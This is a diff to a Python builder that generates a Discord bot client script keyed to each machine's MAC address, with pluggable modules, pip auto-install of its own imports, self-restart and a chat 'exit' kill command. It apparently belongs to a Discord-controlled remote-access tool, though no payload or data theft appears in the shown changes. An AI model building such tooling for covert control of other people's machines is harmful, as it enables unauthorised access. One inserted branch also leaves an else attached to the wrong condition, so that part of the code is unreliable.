@@ -33,12 +33,12 @@ print(f"[+] Reading settings from {settings_path} successfully")
 
 # --- Prepare the initial client script ---
 initial_script = """
-
 import os
 import sys
 import subprocess
 import re
-from uuid import getnode
+import uuid
+invalid_modules = {"__(module_name)", '"', "'", '",', '__(module)'}
 
 def installModuleIfMissing(module_name):
     try:
@@ -46,18 +46,51 @@ def installModuleIfMissing(module_name):
         print(f"[OK] {module_name} is already installed")
     except ImportError:
         print(f"[MISSING] {module_name} is missing, installing...")
-        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
-        print(f"[OK] {module_name} has been installed")
+        try:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
+            print(f"[OK] {module_name} has been installed")
+        except subprocess.CalledProcessError:
+            print(f"[ERROR] Installation of {module_name} failed")
 
-# Try to import discord, install if missing
-installModuleIfMissing("discord")
-import discord
+# Gather modules from the current file
+required_modules = []
+with open(__file__, "r") as f:
+    for line in f:
+        if "import" in line and not line.strip().startswith("#"):
+            # A simplistic extraction of the module name after the keyword 'import'
+            parts = line.split("import", 1)
+            if len(parts) < 2:
+                continue
+            module_candidate = parts[1].strip().split()[0]
+            # Skip if the candidate is in our invalid tokens list or doesn't match our valid module pattern
+            if module_candidate in invalid_modules:
+                continue
+            required_modules.append(module_candidate)
+            print("[+] Checking module: " + module_candidate)
+            installModuleIfMissing(module_candidate)
+
+# Now check that all required modules are available.
+missing_modules = []
+for module in required_modules:
+    try:
+        __import__(module)
+    except ImportError:
+        missing_modules.append(module)
+
+if missing_modules:
+    print("The following modules are still missing:", missing_modules)
+    os.system(f"{sys.executable} {__file__}")
+    os.kill(os.getpid(), 9)
+else:
+    print("All modules installed successfully.")
+"""
+discord_code = """
 
 # Initialize global variables
 intents = discord.Intents.all()
 intents.members = True
 client = discord.Client(intents=intents)
-mac_address = str(getnode())
+mac_address = ''.join(('%012x' % uuid.getnode())[i:i+2] for i in range(0, 12, 2))
 sessions = {}
 
 class UserSession:
@@ -174,6 +207,10 @@ async def on_message(message):
                     color=0xff0000
                 )
                 await message.reply(embed=error_embed)
+    elif message.content.lower() == "exit":
+        await message.channel.send("```diff\\n+ Exiting...\\n```")
+        os.kill(os.getpid(), 9)
+
 """
 
 # --- Process additional component modules (if any) ---
@@ -203,6 +240,9 @@ for module_name, is_enabled in modules_config.items():
         if hasattr(module, "get_code"):
             print(f"[+] Adding code from {module_name}")
             modules_code += module.get_code()
+        if hasattr(module, "get_dependencies"):
+            print(f"[+] Adding dependencies from {module_name}")
+            initial_script += module.get_dependencies() 
         else:
             print(f"[-] Module {module_name} does not have a get_code function")
     except Exception as error:
@@ -219,7 +259,7 @@ step3 = """
 # Start the bot
 client.run(bottoken)
 """
-final_script = step1 + initial_script + modules_code + step3
+final_script = step1 + initial_script + discord_code + modules_code + step3
 
 # --- Write the client script to file ---
 with open(client_script_path, "w") as file:
